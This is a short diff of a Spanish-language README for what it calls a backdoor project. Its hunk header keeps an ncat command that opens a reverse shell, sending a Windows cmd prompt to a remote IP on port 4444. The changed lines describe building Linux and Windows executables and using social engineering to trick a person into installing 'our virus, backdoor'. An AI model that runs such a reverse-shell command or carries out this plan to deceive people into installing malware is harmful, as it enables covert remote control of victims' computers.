@@ -47,9 +47,9 @@ ncat -v 192.168.1.200 4444 -e cmd
 * El puerto esta por defecto en 4444. 
 
 
-# Por supuesto aqui estamos haciendo pruebas! 
-* Tenemos que usar un lenguaje y escribir nuestro codigo y crear un archivo executable tanto en linux como en windows, 
+# Por supuesto aqui estamos haciendo pruebas de nuestro backdoor. 
+* Tenemos que usar un lenguaje y escribir nuestro codigo y crear un archivo executable tanto en linux como en windows.
 * Y usar ingenieria social para hacer que esa persona instale nuestro virus, backdoor..etc.
 
 # Ire actualizando el repo.
-
+# TmCyber
